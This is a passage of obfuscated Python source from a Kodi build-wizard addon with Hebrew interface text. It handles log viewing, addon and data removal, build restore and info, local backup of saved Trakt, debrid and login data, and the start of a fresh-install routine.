		def showdialog (O00OO0OOOO00OOO00 ):#line:4964
			O00OO0OOOO00OOO00 .getControl (O00OO0OOOO00OOO00 .title ).setLabel (O00OO0OOOO00OOO00 .titlemsg )#line:4965
			O00OO0OOOO00OOO00 .getControl (O00OO0OOOO00OOO00 .msg ).setText (wiz .highlightText (O00OO0OOOO00OOO00 .logmsg ))#line:4966
			O00OO0OOOO00OOO00 .setFocusId (O00OO0OOOO00OOO00 .scrollbar )#line:4967
		def onClick (OO00OOO0OOOOOOO00 ,OOO00O00O0OOO000O ):#line:4969
			if OOO00O00O0OOO000O ==OO00OOO0OOOOOOO00 .okbutton :OO00OOO0OOOOOOO00 .close ()#line:4970
			elif OOO00O00O0OOO000O ==OO00OOO0OOOOOOO00 .upload :OO00OOO0OOOOOOO00 .close ();uploadLog .Main ()#line:4971
			elif OOO00O00O0OOO000O ==OO00OOO0OOOOOOO00 .kodi :#line:4972
				O0OO0OOO0O0O00OOO =wiz .Grab_Log (False )#line:4973
				OO0O0O00OOO000OO0 =wiz .Grab_Log (True )#line:4974
				if O0OO0OOO0O0O00OOO ==False :#line:4975
					OO00OOO0OOOOOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4976
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4977
				else :#line:4978
					OO00OOO0OOOOOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0O00OOO000OO0 .replace (LOG ,''))#line:4979
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .title ).setLabel (OO00OOO0OOOOOOO00 .titlemsg )#line:4980
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText (wiz .highlightText (O0OO0OOO0O0O00OOO ))#line:4981
					OO00OOO0OOOOOOO00 .setFocusId (OO00OOO0OOOOOOO00 .scrollbar )#line:4982
			elif OOO00O00O0OOO000O ==OO00OOO0OOOOOOO00 .kodiold :#line:4983
				O0OO0OOO0O0O00OOO =wiz .Grab_Log (False ,True )#line:4984
				OO0O0O00OOO000OO0 =wiz .Grab_Log (True ,True )#line:4985
				if O0OO0OOO0O0O00OOO ==False :#line:4986
					OO00OOO0OOOOOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4987
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4988
				else :#line:4989
					OO00OOO0OOOOOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0O00OOO000OO0 .replace (LOG ,''))#line:4990
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .title ).setLabel (OO00OOO0OOOOOOO00 .titlemsg )#line:4991
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText (wiz .highlightText (O0OO0OOO0O0O00OOO ))#line:4992
					OO00OOO0OOOOOOO00 .setFocusId (OO00OOO0OOOOOOO00 .scrollbar )#line:4993
			elif OOO00O00O0OOO000O ==OO00OOO0OOOOOOO00 .wizard :#line:4994
				O0OO0OOO0O0O00OOO =wiz .Grab_Log (False ,False ,True )#line:4995
				OO0O0O00OOO000OO0 =wiz .Grab_Log (True ,False ,True )#line:4996
				if O0OO0OOO0O0O00OOO ==False :#line:4997
					OO00OOO0OOOOOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4998
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4999
				else :#line:5000
					OO00OOO0OOOOOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0O00OOO000OO0 .replace (ADDONDATA ,''))#line:5001
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .title ).setLabel (OO00OOO0OOOOOOO00 .titlemsg )#line:5002
					OO00OOO0OOOOOOO00 .getControl (OO00OOO0OOOOOOO00 .msg ).setText (wiz .highlightText (O0OO0OOO0O0O00OOO ))#line:5003
					OO00OOO0OOOOOOO00 .setFocusId (OO00OOO0OOOOOOO00 .scrollbar )#line:5004
		def onAction (O0O0O0O00O0O00OO0 ,OOOOOO0O00OO0OO0O ):#line:5006
			if OOOOOO0O00OO0OO0O ==ACTION_PREVIOUS_MENU :O0O0O0O00O0O00OO0 .close ()#line:5007
			elif OOOOOO0O00OO0OO0O ==ACTION_NAV_BACK :O0O0O0O00O0O00OO0 .close ()#line:5008
	if default ==None :default =wiz .Grab_Log (True )#line:5009
	OOOO0O0OO00OOO000 =OOO00O00O0O000OO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5010
	OOOO0O0OO00OOO000 .doModal ()#line:5011
	del OOOO0O0OO00OOO000 #line:5012
def removeAddon (O0O0000OOO000OO0O ,O0000000O00O0O0OO ,over =False ):#line:5014
	if not over ==False :#line:5015
		O0O0O00OOO00OOO0O =1 #line:5016
	else :#line:5017
		O0O0O00OOO00OOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000000O00O0O0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O0000OOO000OO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5018
	if O0O0O00OOO00OOO0O ==1 :#line:5019
		OO0OOOOO0O0O000OO =os .path .join (ADDONS ,O0O0000OOO000OO0O )#line:5020
		wiz .log ("Removing Addon %s"%O0O0000OOO000OO0O )#line:5021
		wiz .cleanHouse (OO0OOOOO0O0O000OO )#line:5022
		xbmc .sleep (1000 )#line:5023
		try :shutil .rmtree (OO0OOOOO0O0O000OO )#line:5024
		except Exception as O0O0O0O00O000O00O :wiz .log ("Error removing %s"%O0O0000OOO000OO0O ,xbmc .LOGNOTICE )#line:5025
		removeAddonData (O0O0000OOO000OO0O ,O0000000O00O0O0OO ,over )#line:5026
	if over ==False :#line:5027
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0000000O00O0O0OO ))#line:5028
def removeAddonData (O0OOOO0OO0000000O ,name =None ,over =False ):#line:5030
	if O0OOOO0OO0000000O =='all':#line:5031
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5032
			wiz .cleanHouse (ADDOND )#line:5033
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5034
	elif O0OOOO0OO0000000O =='uninstalled':#line:5035
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5036
			OOOOOOOO000O000O0 =0 #line:5037
			for OO0OOOO00OOO000OO in glob .glob (os .path .join (ADDOND ,'*')):#line:5038
				O0O00OOOO0OOO00OO =OO0OOOO00OOO000OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5039
				if O0O00OOOO0OOO00OO in EXCLUDES :pass #line:5040
				elif os .path .exists (os .path .join (ADDONS ,O0O00OOOO0OOO00OO )):pass #line:5041
				else :wiz .cleanHouse (OO0OOOO00OOO000OO );OOOOOOOO000O000O0 +=1 ;wiz .log (OO0OOOO00OOO000OO );shutil .rmtree (OO0OOOO00OOO000OO )#line:5042
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOOOO000O000O0 ))#line:5043
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5044
	elif O0OOOO0OO0000000O =='empty':#line:5045
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5046
			OOOOOOOO000O000O0 =wiz .emptyfolder (ADDOND )#line:5047
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOOOO000O000O0 ))#line:5048
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5049
	else :#line:5050
		O00OOOO0O0O0O0OO0 =os .path .join (USERDATA ,'addon_data',O0OOOO0OO0000000O )#line:5051
		if O0OOOO0OO0000000O in EXCLUDES :#line:5052
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5053
		elif os .path .exists (O00OOOO0O0O0O0OO0 ):#line:5054
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOO0OO0000000O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5055
				wiz .cleanHouse (O00OOOO0O0O0O0OO0 )#line:5056
				try :#line:5057
					shutil .rmtree (O00OOOO0O0O0O0OO0 )#line:5058
				except :#line:5059
					wiz .log ("Error deleting: %s"%O00OOOO0O0O0O0OO0 )#line:5060
			else :#line:5061
				wiz .log ('Addon data for %s was not removed'%O0OOOO0OO0000000O )#line:5062
	wiz .refresh ()#line:5063
def restoreit (O0OO00O0O0O0OOO0O ):#line:5065
	if O0OO00O0O0O0OOO0O =='build':#line:5066
		OOOOOO0O000OO0OOO =freshStart ('restore')#line:5067
		if OOOOOO0O000OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5068
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:5069
		wiz .skinToDefault ()#line:5070
	wiz .restoreLocal (O0OO00O0O0O0OOO0O )#line:5071
def restoreextit (O000OO00OO0OO0O0O ):#line:5073
	if O000OO00OO0OO0O0O =='build':#line:5074
		OOO00O0O0O000O000 =freshStart ('restore')#line:5075
		if OOO00O0O0O000O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5076
	wiz .restoreExternal (O000OO00OO0OO0O0O )#line:5077
def buildInfo (OO0000OO00O0O0OO0 ):#line:5079
	if wiz .workingURL (SPEEDFILE )==True :#line:5080
		if wiz .checkBuild (OO0000OO00O0O0OO0 ,'url'):#line:5081
			OO0000OO00O0O0OO0 ,O00000O00O0OOO0OO ,OO00OOO0000O0O00O ,O0O0O0OO0O00000O0 ,OOOOOOO0O00O0O000 ,O00O0O00OOO00OO0O ,OOOO0000O000OOOO0 ,OO00OO00OO00O0000 ,O0000OOOOOOO00OOO ,OOOO00OO00O0O00O0 ,O00O0OOOOO000O000 =wiz .checkBuild (OO0000OO00O0O0OO0 ,'all')#line:5082
			OOOO00OO00O0O00O0 ='Yes'if OOOO00OO00O0O00O0 .lower ()=='yes'else 'No'#line:5083
			OO0OOOO0O0OO0O00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0000OO00O0O0OO0 )#line:5084
			OO0OOOO0O0OO0O00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00000O00O0OOO0OO )#line:5085
			if not O00O0O00OOO00OO0O =="http://":#line:5086
				OOOO0000O00000O0O =wiz .themeCount (OO0000OO00O0O0OO0 ,False )#line:5087
				OO0OOOO0O0OO0O00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOO0000O00000O0O ))#line:5088
			OO0OOOO0O0OO0O00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O000 )#line:5089
			OO0OOOO0O0OO0O00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00OO00O0O00O0 )#line:5090
			OO0OOOO0O0OO0O00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOOOO000O000 )#line:5091
			wiz .TextBox (ADDONTITLE ,OO0OOOO0O0OO0O00O )#line:5092
		else :wiz .log ("Invalid Build Name!")#line:5093
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5094
def buildVideo (OOO0OOOO0000O0O00 ):#line:5096
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5097
	if wiz .workingURL (SPEEDFILE )==True :#line:5098
		O00O0O0OOOO0OOOO0 =wiz .checkBuild (OOO0OOOO0000O0O00 ,'preview')#line:5099
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO0OOOO0000O0O00 )#line:5100
		if O00O0O0OOOO0OOOO0 and not O00O0O0OOOO0OOOO0 =='http://':playVideo (O00O0O0OOOO0OOOO0 )#line:5101
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO0OOOO0000O0O00 )#line:5102
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5103
def dependsList (OO00OOO0O00000O0O ):#line:5105
	O00OOOO0000OO000O =os .path .join (ADDONS ,OO00OOO0O00000O0O ,'addon.xml')#line:5106
	if os .path .exists (O00OOOO0000OO000O ):#line:5107
		O0OO00000OO0OO0OO =open (O00OOOO0000OO000O ,mode ='r');O0000OOOOOO0OOOOO =O0OO00000OO0OO0OO .read ();O0OO00000OO0OO0OO .close ();#line:5108
		OOOO0O0O000OOO00O =wiz .parseDOM (O0000OOOOOO0OOOOO ,'import',ret ='addon')#line:5109
		O0OO00OO0000O0OOO =[]#line:5110
		for OO0OOO0O00O0OO0O0 in OOOO0O0O000OOO00O :#line:5111
			if not 'xbmc.python'in OO0OOO0O00O0OO0O0 :#line:5112
				O0OO00OO0000O0OOO .append (OO0OOO0O00O0OO0O0 )#line:5113
		return O0OO00OO0000O0OOO #line:5114
	return []#line:5115
def manageSaveData (OO000OOO0OO00OO00 ):#line:5117
	if OO000OOO0OO00OO00 =='import':#line:5118
		OOOO00O0OOOO000OO =os .path .join (ADDONDATA ,'temp')#line:5119
		if not os .path .exists (OOOO00O0OOOO000OO ):os .makedirs (OOOO00O0OOOO000OO )#line:5120
		OO00OO00O00000OO0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5121
		if not OO00OO00O00000OO0 .endswith ('.zip'):#line:5122
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5123
			return #line:5124
		O00OO0OOO0O00O0O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:5125
		OOO0OO00O0OOO000O =xbmcvfs .copy (OO00OO00O00000OO0 ,O00OO0OOO0O00O0O0 )#line:5126
		wiz .log ("%s"%str (OOO0OO00O0OOO000O ))#line:5127
		extract .all (xbmc .translatePath (O00OO0OOO0O00O0O0 ),OOOO00O0OOOO000OO )#line:5128
		OO0OO000OO0O0O0O0 =os .path .join (OOOO00O0OOOO000OO ,'trakt')#line:5129
		O0O0OO0000OO00O0O =os .path .join (OOOO00O0OOOO000OO ,'login')#line:5130
		OO0O0000O00000OO0 =os .path .join (OOOO00O0OOOO000OO ,'debrid')#line:5131
		OOO0000O0OOOO0O00 =0 #line:5132
		if os .path .exists (OO0OO000OO0O0O0O0 ):#line:5133
			OOO0000O0OOOO0O00 +=1 #line:5134
			O000O0OOO00O0OOO0 =os .listdir (OO0OO000OO0O0O0O0 )#line:5135
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5136
			for O0OOOOOOO000OO00O in O000O0OOO00O0OOO0 :#line:5137
				OO000OO0O00O0O00O =os .path .join (traktit .TRAKTFOLD ,O0OOOOOOO000OO00O )#line:5138
				OOOO00OOO0OO0OOO0 =os .path .join (OO0OO000OO0O0O0O0 ,O0OOOOOOO000OO00O )#line:5139
				if os .path .exists (OO000OO0O00O0O00O ):#line:5140
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOOOOO000OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5141
					else :os .remove (OO000OO0O00O0O00O )#line:5142
				shutil .copy (OOOO00OOO0OO0OOO0 ,OO000OO0O00O0O00O )#line:5143
			traktit .importlist ('all')#line:5144
			traktit .traktIt ('restore','all')#line:5145
		if os .path .exists (O0O0OO0000OO00O0O ):#line:5146
			OOO0000O0OOOO0O00 +=1 #line:5147
			O000O0OOO00O0OOO0 =os .listdir (O0O0OO0000OO00O0O )#line:5148
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5149
			for O0OOOOOOO000OO00O in O000O0OOO00O0OOO0 :#line:5150
				OO000OO0O00O0O00O =os .path .join (loginit .LOGINFOLD ,O0OOOOOOO000OO00O )#line:5151
				OOOO00OOO0OO0OOO0 =os .path .join (O0O0OO0000OO00O0O ,O0OOOOOOO000OO00O )#line:5152
				if os .path .exists (OO000OO0O00O0O00O ):#line:5153
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOOOOO000OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5154
					else :os .remove (OO000OO0O00O0O00O )#line:5155
				shutil .copy (OOOO00OOO0OO0OOO0 ,OO000OO0O00O0O00O )#line:5156
			loginit .importlist ('all')#line:5157
			loginit .loginIt ('restore','all')#line:5158
		if os .path .exists (OO0O0000O00000OO0 ):#line:5159
			OOO0000O0OOOO0O00 +=1 #line:5160
			O000O0OOO00O0OOO0 =os .listdir (OO0O0000O00000OO0 )#line:5161
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5162
			for O0OOOOOOO000OO00O in O000O0OOO00O0OOO0 :#line:5163
				OO000OO0O00O0O00O =os .path .join (debridit .REALFOLD ,O0OOOOOOO000OO00O )#line:5164
				OOOO00OOO0OO0OOO0 =os .path .join (OO0O0000O00000OO0 ,O0OOOOOOO000OO00O )#line:5165
				if os .path .exists (OO000OO0O00O0O00O ):#line:5166
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOOOOOO000OO00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5167
					else :os .remove (OO000OO0O00O0O00O )#line:5168
				shutil .copy (OOOO00OOO0OO0OOO0 ,OO000OO0O00O0O00O )#line:5169
			debridit .importlist ('all')#line:5170
			debridit .debridIt ('restore','all')#line:5171
		wiz .cleanHouse (OOOO00O0OOOO000OO )#line:5172
		wiz .removeFolder (OOOO00O0OOOO000OO )#line:5173
		os .remove (O00OO0OOO0O00O0O0 )#line:5174
		if OOO0000O0OOOO0O00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5175
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5176
	elif OO000OOO0OO00OO00 =='export':#line:5177
		OO0O00O000OO0OOO0 =xbmc .translatePath (MYBUILDS )#line:5178
		OO0O00O0O0O000O00 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5179
		traktit .traktIt ('update','all')#line:5180
		loginit .loginIt ('update','all')#line:5181
		debridit .debridIt ('update','all')#line:5182
		OO00OO00O00000OO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5183
		OO00OO00O00000OO0 =xbmc .translatePath (OO00OO00O00000OO0 )#line:5184
		O0O0OO00OO0O0000O =os .path .join (OO0O00O000OO0OOO0 ,'SaveData.zip')#line:5185
		O00O000O00OO0OOOO =zipfile .ZipFile (O0O0OO00OO0O0000O ,mode ='w')#line:5186
		for O0O0000O0OOO0O0O0 in OO0O00O0O0O000O00 :#line:5187
			if os .path .exists (O0O0000O0OOO0O0O0 ):#line:5188
				O000O0OOO00O0OOO0 =os .listdir (O0O0000O0OOO0O0O0 )#line:5189
				for OO000O0000O0O00OO in O000O0OOO00O0OOO0 :#line:5190
					O00O000O00OO0OOOO .write (os .path .join (O0O0000O0OOO0O0O0 ,OO000O0000O0O00OO ),os .path .join (O0O0000O0OOO0O0O0 ,OO000O0000O0O00OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5191
		O00O000O00OO0OOOO .close ()#line:5192
		if OO00OO00O00000OO0 ==OO0O00O000OO0OOO0 :#line:5193
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00OO0O0000O ))#line:5194
		else :#line:5195
			try :#line:5196
				xbmcvfs .copy (O0O0OO00OO0O0000O ,os .path .join (OO00OO00O00000OO0 ,'SaveData.zip'))#line:5197
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00OO00O00000OO0 ,'SaveData.zip')))#line:5198
			except :#line:5199
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO00OO0O0000O ))#line:5200
def freshStart (install =None ,over =False ):#line:5205
	if USERNAME =='':#line:5206
		ADDON .openSettings ()#line:5207
		sys .exit ()#line:5208
	OOO00000O0O000O0O =(SPEEDFILE )#line:5209
	(OOO00000O0O000O0O )#line:5210
	O0000000O00O00OO0 =(wiz .workingURL (OOO00000O0O000O0O ))#line:5211
	(O0000000O00O00OO0 )#line:5212
	if KEEPTRAKT =='true':#line:5213
		traktit .autoUpdate ('all')#line:5214
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5215
	if KEEPREAL =='true':#line:5216
		debridit .autoUpdate ('all')#line:5217
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5218
	if KEEPLOGIN =='true':#line:5219
		loginit .autoUpdate ('all')#line:5220
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5221
	if over ==True :O0O0O0000OOOO0O00 =1 #line:5222
	elif install =='restore':O0O0O0000OOOO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5223
	elif install :O0O0O0000OOOO0O00 =1 #line:5224
	else :O0O0O0000OOOO0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5225
	if O0O0O0000OOOO0O00 :#line:5226
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5227
			O0O00O00O0000OO00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5228
			skinSwitch .swapSkins (O0O00O00O0000OO00 )#line:5231
			O000000000OO0O000 =0 #line:5232
			xbmc .sleep (1000 )#line:5233
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000000000OO0O000 <150 :#line:5234
				O000000000OO0O000 +=1 #line:5235
				xbmc .sleep (1000 )#line:5236
				wiz .ebi ('SendAction(Select)')#line:5237
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5238
				wiz .ebi ('SendClick(11)')#line:5239
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5240
			xbmc .sleep (1000 )#line:5241
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5242
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5243
			return #line:5244
		wiz .addonUpdates ('set')#line:5245
		OOOO00O0OO0O00OOO =os .path .abspath (HOME )#line:5246
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5247
		OO0O00O000O000O00 =sum ([len (O000O0OOOO0O0OO00 )for OOO0OO000OOO0OO00 ,OOOO0O0000OOOOO0O ,O000O0OOOO0O0OO00 in os .walk (OOOO00O0OO0O00OOO )]);O00OOOO00OO0O0OO0 =0 #line:5248
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5249
		EXCLUDES .append ('My_Builds')#line:5250
		EXCLUDES .append ('archive_cache')#line:5251
		EXCLUDES .append ('script.module.requests')#line:5252
		EXCLUDES .append ('myfav.anon')#line:5253
		if KEEPREPOS =='true':#line:5254
			O0OO0OO000OO0OO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5255
			for O00O00000O0OO000O in O0OO0OO000OO0OO0O :#line:5256
				OOOO0O0O0O00OO0O0 =os .path .split (O00O00000O0OO000O [:-1 ])[1 ]#line:5257
				if not OOOO0O0O0O00OO0O0 ==EXCLUDES :#line:5258
					EXCLUDES .append (OOOO0O0O0O00OO0O0 )#line:5259
		if KEEPSUPER =='true':#line:5260
			EXCLUDES .append ('plugin.program.super.favourites')#line:5261
		if KEEPMOVIELIST =='true':#line:5262
			EXCLUDES .append ('plugin.video.metalliq')#line:5263
		if KEEPMOVIELIST =='true':#line:5264
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5265
		if KEEPADDONS =='true':#line:5266
			EXCLUDES .append ('addons')#line:5267
		if KEEPTELEMEDIA =='true':#line:5268
			EXCLUDES .append ('plugin.video.telemedia')#line:5269
		EXCLUDES .append ('plugin.video.elementum')#line:5274
		EXCLUDES .append ('script.elementum.burst')#line:5275
		EXCLUDES .append ('script.elementum.burst-master')#line:5276
		EXCLUDES .append ('plugin.video.quasar')#line:5277
		EXCLUDES .append ('script.quasar.burst')#line:5278
		EXCLUDES .append ('skin.estuary')#line:5279
		if KEEPWHITELIST =='true':#line:5282
			O0O00O0O0000OOO0O =''#line:5283
			OOOOOOO0OOO0O0O00 =wiz .whiteList ('read')#line:5284
			if len (OOOOOOO0OOO0O0O00 )>0 :#line:5285
				for O00O00000O0OO000O in OOOOOOO0OOO0O0O00 :#line:5286
					try :O00OO000000O00OO0 ,O0O0OOO00OO0O000O ,OO0O000OO00000O0O =O00O00000O0OO000O #line:5287
					except :pass #line:5288
					if OO0O000OO00000O0O .startswith ('pvr'):O0O00O0O0000OOO0O =O0O0OOO00OO0O000O #line:5289
					O0OO00OO000O0000O =dependsList (OO0O000OO00000O0O )#line:5290
					for O0O0O0O000OO00OOO in O0OO00OO000O0000O :#line:5291
						if not O0O0O0O000OO00OOO in EXCLUDES :#line:5292
